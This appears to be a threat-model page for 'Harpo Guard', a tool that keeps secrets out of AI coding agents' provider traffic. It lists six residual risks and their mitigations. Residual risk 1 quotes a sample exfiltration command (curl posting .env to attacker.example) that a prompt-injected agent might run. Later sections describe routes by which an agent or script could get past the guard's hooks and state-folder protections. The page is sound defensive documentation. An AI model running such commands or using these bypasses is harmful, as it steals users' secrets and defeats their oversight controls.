# Threat model and residual risks

SEC-06. Harpo Guard protects one boundary: data leaving your machine toward the configured LLM provider. This page states what it doesn't protect, so nobody mistakes it for a sandbox. The full threat model, including the STRIDE analysis of Guard itself, is in the [design doc](design.md#threat-model).

Facts about Claude Code and Codex were checked against their documentation on Sep 30, 2026, for Claude Code 2.1.286 and Codex CLI 0.159.2.

## What is covered today

| Layer | Status | Covers |
| --- | --- | --- |
| Read tool (`safe_read`, `safe_grep`) | Shipped (M1) | Files the agent reads through it, once [setup](setup.md) denies the built-in reads. A content-aware hook also refuses built-in reads and shell reads of any file holding a secret, on Claude Code, and on Codex once you trust the hook in `/hooks`. |
| Egress gate | Built on this branch (M2), not in a release yet. `harpo guard up` starts it and routes the agents to it | Every request sent to the API base URL the harness is pointed at, including shell output and tool results |
| Commit scanner | Shipped | Secrets on their way into git |

Without the gate (v1.3.0, or `harpo guard down`), a secret the agent reaches by any route other than `safe_read` goes to the model. That includes a script that opens files itself, a path built from shell variables, and, on Codex before you trust the hook, any ordinarily named file that holds a token. That includes `env`, test output, a stack trace, `git log -p`, or a script that prints a file.

## Residual risk 1: other exfiltration channels

**Risk.** A prompt-injected agent doesn't need to see a secret to steal it. For example, `curl -d @.env https://attacker.example` moves the file straight from disk to the attacker. The secret never enters the model's context, so neither the read tool nor the gate sees it. The same applies to:
- DNS lookups that encode data;
- `git push` to an attacker's remote;
- a secret written into a public pull request or issue;
- an MCP server or connector that makes its own network calls.

**Why Guard can't fix it.** Guard inspects content bound for the provider. Stopping this needs control of network destinations and process behavior, which is a sandbox or an EDR, not data loss prevention. It is a non-goal for v1, and the behavior sensor in the separate lab repo targets it.

**What helps:**
- **Turn on the harness's own network isolation:**
  - Claude Code's Bash sandbox, with an allowlist of network domains;
  - a Codex permission profile with `[permissions.<name>.network]` and a domain allowlist.
- **Plant canary tokens** in places an attacker would look, to detect exfiltration after the fact.

## Residual risk 2: transcripts saved to local disk with raw tool output

**Risk.** Both harnesses write every session to disk in plaintext, including raw tool output.
- **Claude Code** keeps transcripts under `~/.claude/projects/` for 30 days by default (setting: `cleanupPeriodDays`).
- **Codex** keeps sessions under `~/.codex/sessions/` and a history file at `~/.codex/history.jsonl` (setting: `history.persistence`).

The gate changes only the copy of a request sent to the provider. The harness's own transcript keeps the raw tool output, so it holds any secret the agent printed through the shell. Malware, a backup, or a synced folder that reaches those directories reaches the secrets too.

Transcripts can also leave the machine on purpose:
- Claude Code's `/feedback`, `/bug`, and `/share` upload the conversation.
- So does answering "Yes" to the optional request to share a transcript after a session quality survey.
- Anthropic's documentation says known key and token patterns are redacted before upload, and file contents are uploaded as-is.

**What Guard does.** Output from `safe_read` and `safe_grep` is already redacted when the harness records it, so files read that way are stored as placeholders. Guard's own logs hold keyed hashes and counts, never values (SEC-01, FR-LOG-01, FR-PROOF-01); the end-to-end suite reads every file under `~/.harpo` and TMPDIR after each run and finds no canary value.

**What helps:**
- **Shorten retention.** In Claude Code, set `cleanupPeriodDays`. In Codex, set `history.persistence = "none"`.
- **Turn off Claude Code's transcript uploads** with `DISABLE_FEEDBACK_COMMAND=1` and `CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY=1`.
- **Keep secrets out of shell output** in the first place, by routing reads through `safe_read`.

## Residual risk 3: agent traffic that bypasses the API base URL

**Risk.** The gate sees only requests sent to the API base URL the harness is pointed at. Both harnesses also make other connections that never pass through it.

**Claude Code:**
- usage metrics, and on Pro and Max sign-ins, error reports (stack traces from Claude Code's own internals);
- feature-flag evaluation;
- sign-in and token refresh with Anthropic's Console auth service;
- install and update downloads;
- the WebFetch domain safety check, which sends the hostname to `api.anthropic.com`;
- `/feedback` uploads to Google Cloud Storage.

**Codex:**
- ChatGPT sign-in and token refresh with OpenAI's auth service;
- machine analytics (`analytics.enabled`);
- an optional OpenTelemetry exporter (`otel.exporter`; prompt export is opt-in through `otel.log_user_prompt`).

None of these channels is meant to carry prompt content, but Guard can't verify that. They also matter for availability: the gate can't break sign-in, because it never sees it. FR-INSTALL-05 requires the gate to forward authentication headers untouched on the requests it does see.

**What helps:**
- **Claude Code:** `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` turns off metrics, error reports, feature flags, and surveys in one switch. The WebFetch check has its own setting, `skipWebFetchPreflight`.
- **Codex:** `analytics.enabled = false`, and leave `otel.exporter` unset.
- **Verify the routing.** `harpo doctor` (FR-INSTALL-02) checks on this machine that each harness is routed to a running gate with the current token and that no setting bypasses it. It sends nothing to a provider, so it cannot see a connection the harness makes on its own (the channels above).

## Residual risk 4: approved edits and the allowlist

**Risk.** Two things let a secret-bearing file reach the model on purpose (FR-READ-05, FR-READ-06).

**Edit grants.** On Claude Code, editing a file that holds a secret asks you first. If you approve, that file's current and future secrets go to the provider as-is for the rest of the session, through built-in Read and Edit of that one file.
- A grant is recorded only after the edit actually ran (PostToolUse), so a declined prompt leaves nothing.
- Grants live in `~/.harpo/grants/<session>.json`. They expire after 24 hours or when the session ends.
- A grant never covers Bash. A shell command that would print the file is still refused.

**Allowlist.** Paths in `~/.harpo/allow` (`harpo allow PATH`) pass the read hook even when they hold secrets, for every session until you remove them. Each pass is logged to `allow.log`, never the content. Name rules (`--name NAME`) apply in every project, so they are broader than a path: names of secret stores, credential folders and wildcards are refused, and broad names such as `src` need an explicit confirmation. Symlinks are resolved before matching, so a link named like a rule but pointing elsewhere does not match. In Claude Code, the `/harpo` slash command changes the list only when you type it in the chat box.

**Why Guard can't fully fix it.**
- A script that writes the grant file or the allowlist itself can forge an entry. This is the same class as the script gap above. The hook refuses shell commands that visibly touch `~/.harpo` or `~/.harpocrates`, and the settings deny Edit and Write there, but a script that builds the path at runtime gets past both.
- A grant names a path, not a file's content. If the file is replaced during the session (for example by `git checkout`), the grant still applies to the new file.
- Codex has no edit prompt. Its edits to such a file are refused, and you make them yourself.

**What helps:** approve edits only for files you accept sending to the provider, and keep the allowlist short.

## Residual risk 5: the hook's own interpreter and the user site

**Risk.** The hook is a Python process the harness starts, and a project's settings can set the environment variables it starts with (SEC-08). Harpo does not trust any of them for anything security-relevant. The state folder (`~/.harpo`) is found from the password database, not from `$HOME`, and the generated hook and MCP commands run the interpreter with `-I` (isolated mode), which ignores `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, the user site-packages and the working directory. A planted `Harpo` package therefore never runs in the hook.

**Why Guard can't fully fix it.** An install into the user site-packages (`pip install --user`) needs that site, which `-I` drops. For that one case the commands use `-E -P` instead (3.11 and later): `-E` ignores the `PYTHON*` variables and `-P` drops the working directory, but Python still finds the user site from `$HOME`. If an agent can set `HOME` for the hook, it can point it at a folder with a planted user site and its own `Harpo`. On Python 3.10 there is no `-P`, so a user-site install gets `-I`, is not found, and the hook fails closed (exit 2).

The Claude Code prompt plugin (`/harpo allow`) has the same exposure in a second place. It runs the interpreter named in `~/.harpo/install.json`, and the plugin runtime offers no password-database lookup, so it finds that file from `HOME`. It reads the record only from a plain folder and a plain file (never through a symlink), accepts only an absolute interpreter path with the flags above, and runs only on your own Enter in the chat box. But a `HOME` that a project's settings point at a folder of its own, holding its own `install.json`, would make the next `/harpo allow` you type run a program of the project's choosing.

**What helps:** install into a virtual environment or the interpreter's own site-packages (the default for `pipx` and `python -m venv`), where the commands use `-I` and nothing in the environment can reach the hook. Do not accept project settings that set `HOME`; the Claude Code workspace-trust prompt is where that is decided.

## Residual risk 6: what the state-folder guard does not cover

**Risk.** The allowlist and the session grants live in `~/.harpo`, and only you may change them. The hook refuses an agent's attempt to write there through the built-in tools and Bash (SEC-08, SEC-09). Three gaps remain.

- **Codex relies on its sandbox until `harpo install` is re-run.** The Codex profile that denies `~/.harpo` and `~/.harpocrates` is written by the installer, so a Codex set up before the upgrade does not have it. The Codex hook also matches only `Bash`: `apply_patch` and Codex's other file tools are unhooked, so an edit to the state folder made with them is stopped only by the sandbox profile, which is off with `sandbox_mode = "danger-full-access"` or `--dangerously-bypass-approvals-and-sandbox`.
- **Third-party MCP write tools are not matched by the Claude Code hook.** The hook matches the built-in tools. A file-writing tool from an MCP server the agent can call is not inspected, and neither Claude Code's `Edit(...)` deny rules nor Codex's profile apply to MCP servers.
- **A script that builds the path at run time.** As for the allowlist and grants above: the guard reads the command text, so a path assembled while the command runs gets past it.

**What helps:** re-run `harpo install` after every upgrade; keep Codex sandboxed; give the agent only MCP servers you trust to write files; keep the allowlist short. The egress gate sees what reaches the provider whichever channel carried it.

## Also out of scope

These are listed in the design doc's non-goals:
- a malicious local user;
- general personal data;
- guaranteed detection of novel secret formats;
- harnesses that can't be routed through a local proxy at all;
- ONNX Runtime telemetry when a host process imports onnxruntime before Harpo, because Harpo disables it only by setting `ORT_DISABLE_TELEMETRY=1` before its own first import (export it yourself in that case).

For the last one, `harpo setup` prints each detected harness's tier. Cursor, OpenCode, and Copilot have no setup yet, and it says plainly that nothing is protected for them today.
